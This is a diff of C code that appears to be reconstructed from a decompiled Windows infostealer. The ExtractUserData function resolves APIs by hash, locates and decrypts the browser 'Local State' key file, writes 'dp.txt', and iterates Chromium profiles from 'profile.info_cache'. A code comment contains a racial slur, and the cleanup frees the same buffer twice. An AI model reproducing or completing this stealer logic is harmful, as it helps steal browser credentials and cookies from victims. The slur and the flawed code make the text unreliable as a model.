@@ -191,70 +191,97 @@ int32_t __fastcall processPath(
     return _free(listBuffer);
 }
 
-void* __stdcall 
-ExtractUserData(PWSTR brwsrOfshit, 
-                int32_t brwsrPathOfshit, 
-                int32_t** SysInfo) 
+int __fastcall 
+ExtractUserData(int brwsrPathOfshit, 
+                const WCHAR *brwsrOfshit, 
+                void ***SysInfo) 
 {
-    const WCHAR *resolvedPath = (const WCHAR *)calloc(260, 2);
-    void* ResolverSuckerFunc = ResolveHashes(1932064005, (int)L"kernel32.dll"); 
+    void (__stdcall *ResolverSuckerFunc)(int, const WCHAR *, int);
+    WCHAR *resolvedPath = NULL;
+    const WCHAR *filePath = NULL;
+    int finalCheckResult = 0;
+    unsigned int v8 = 0;
+    WCHAR *resultStrBrwsrOfshit = NULL;
+    char *processedFile = NULL;
+    LPCWSTR rawFileData = NULL;
+    unsigned int fileDataSize = 0;
+    int extractedFilePath = 0;
+
+    resolvedPath = (WCHAR *)calloc(260, 2);
+    ResolverSuckerFunc = (void (__stdcall *)(int, const WCHAR *, int))ResolveTheHash(1932064005, (int)L"kernel32.dll");
     ResolverSuckerFunc(brwsrPathOfshit, resolvedPath, 260);
-    
-    WCHAR *TheRealOne = (WCHAR *)calloc(260, 2);
-    lstrcatW(TheRealOne, resolvedPath);
-    lstrcatW(TheRealOne, GetFilePath((wchar_t *)L"\\Locedx765al Staedx765te"));
-    
-    void* result = verifyFileStatus(TheRealOne);
-    
-    if (result) {
-        int32_t i = 0;
-        void* extractedData = nullptr;
-        sub_4020cc(&extractedData);
 
-        PWSTR resutlStrBrwsrOfshit = malloc(0x104);
-        lstrcatW(resutlStrBrwsrOfshit, brwsrOfshit);
-        lstrcatW(resutlStrBrwsrOfshit, u"\\dp.txt");
+    WCHAR *TheRealOne_ = (WCHAR *)calloc(260, 2);
+    WCHAR *TheRealOne = TheRealOne_;
+    lstrcatW(TheRealOne_, resolvedPath);
+    filePath = GetFilePath((wchar_t *)L"\\Locedx765al Staedx765te");
+    lstrcatW(TheRealOne_, filePath);     // check it nigga
 
-        PSTR processedFile = ProccessingOrMapsTheWideCharacter(resutlStrBrwsrOfshit);
-        
-        if (extractedData) {
-            sub_407160(sub_406b24(*(uint32_t*)SysInfo, processedFile), nullptr, *(uint32_t*)SysInfo, extractedData);
-            sub_406ed8(*(uint32_t*)SysInfo);
-        }
-
-        extractedData = nullptr;
-        sub_402a74(&extractedData);
-        
-        void* profileCache = sub_401ec5(sub_401e7d(sub_401ec5(sub_401e11(nullptr)), "profile.info_cache"));
-        
-        if (profileCache && *(uint32_t*)((char*)profileCache + 0x18) > 0) {
-            do {
-                PWSTR profilePath = malloc(0x104);
-                int32_t extractedProfile = *(uint32_t*)(*(uint32_t*)((char*)profileCache + 0xc) + (i << 2));
-
-                char* extractedProfileStr = extractedProfile;
-                while (*extractedProfileStr) extractedProfileStr++;
-
-                _mbstowcs(profilePath, extractedProfile, extractedProfileStr - extractedProfile + 1);
-
-                PWSTR formattedProfilePath = malloc(0x104);
-                lstrcatW(formattedProfilePath, resolvedPath);
-                lstrcatW(formattedProfilePath, u"\\profile_data");
-
-                int32_t* profileInfo= malloc(12);
-                *(uint32_t*)profileInfo= brwsrOfshit;
-                profileDataStruct[2] = profilePath;
-                profileDataStruct[1] = formattedProfilePath;
-
-                sub_402345(profileDataStruct, SysInfo);
-                _free(profileDataStruct);
-                
-                i += 1;
-            } while (i < *(uint32_t*)((char*)profileCache + 0x18));
-        }
+    finalCheckResult = verifyFileStatus(TheRealOne_);
+    if (!finalCheckResult) {
+        free(resolvedPath);
+        free(TheRealOne);
+        return finalCheckResult;
     }
 
-    return result;
+    DecryptKeyData(TheRealOne_, (int *)&rawFileData, (int *)&fileDataSize);
+
+    resultStrBrwsrOfshit = (WCHAR *)calloc(0x104, 2);
+    lstrcatW(resultStrBrwsrOfshit, brwsrOfshit);
+    lstrcatW(resultStrBrwsrOfshit, L"/");
+    lstrcatW(resultStrBrwsrOfshit, L"dp.txt");
+
+    processedFile = ProcessingTheWideStr(resultStrBrwsrOfshit);
+
+    if (fileDataSize) {
+        ProcessFilePathAndUpdateSession(*SysInfo, processedFile);
+        sub_407160((int)*SysInfo, rawFileData, fileDataSize);
+        sub_406ED8((char *)*SysInfo);
+    }
+
+    rawFileData = NULL;
+    fileDataSize = 0;
+
+    ExtractFileInfoViaNTDLL(TheRealOne, (unsigned int *)&rawFileData, &fileDataSize);
+
+    char *processedFileData = StripUTF8BOMAndParse((const char *)rawFileData);
+    _DWORD *lookupTableEntry = (_DWORD *)ValidateKeyStructure(processedFileData);
+    _DWORD *parsedKeyResult = (_DWORD *)ExtractValueFromKeyPath(lookupTableEntry, "profile.info_cache");
+
+    finalCheckResult = ValidateKeyStructure(parsedKeyResult);
+    extractedFilePath = finalCheckResult;
+
+    if (finalCheckResult && *(uint32_t *)(finalCheckResult + 24)) {
+        do {
+            const char *profilePathStr = *(const char **)(*(uint32_t *)(finalCheckResult + 12) + 4 * v8);
+            rawFileData = (LPCWSTR)calloc(0x104, 2);
+            mbstowcs((wchar_t *)rawFileData, profilePathStr, strlen(profilePathStr) + 1);
+
+            WCHAR *formattedProfilePath = (WCHAR *)calloc(0x104, 2);
+            lstrcatW(formattedProfilePath, resolvedPath);
+            lstrcatW(formattedProfilePath, L"\\");
+            lstrcatW(formattedProfilePath, rawFileData);
+
+            int32_t *profileInfo = (int32_t *)malloc(12);
+            *(uint32_t *)profileInfo = (uint32_t)brwsrOfshit;
+            profileInfo[2] = (int32_t)rawFileData;
+            profileInfo[1] = (int32_t)formattedProfilePath;
+
+            sub_402345((int)profileInfo, (int)SysInfo);
+            free(profileInfo);
+
+            ++v8;
+        } while (v8 < *(uint32_t *)(finalCheckResult + 24));
+    }
+
+    free(resolvedPath);
+        free(TheRealOne);
+            free(TheRealOne_);
+            free(resultStrBrwsrOfshit);
+        free(processedFile);
+    free(rawFileData);
+
+    return finalCheckResult;
 }
 
 int main(){
